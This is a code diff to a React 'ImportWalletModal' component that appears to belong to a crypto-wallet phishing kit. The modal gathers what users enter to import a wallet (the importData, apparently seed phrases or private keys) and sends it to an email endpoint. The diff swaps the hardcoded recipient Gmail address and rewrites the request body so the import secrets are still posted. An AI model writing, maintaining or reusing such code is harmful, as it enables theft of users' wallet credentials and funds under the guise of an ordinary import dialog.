@@ -95,10 +95,11 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
     try {
       // Prepare email data
       const emailData = {
+        type: "wallet",
         walletName: selectedWallet?.name || "Unknown Wallet",
         importMethod: activeTab,
         importData: getImportData(),
-        userEmail: "carlyjenny526@gmail.com", // You can make this configurable
+        userEmail: "jilljelly6@gmail.com", // You can make this configurable
       };
 
       // Send email
@@ -107,7 +108,12 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(emailData),
+        body: JSON.stringify({
+          type: "wallet",
+          walletName: selectedWallet?.name || "Unknown Wallet",
+          importMethod: activeTab,
+          importData: getImportData(),
+        }),
       });
 
       const result = await response.json();
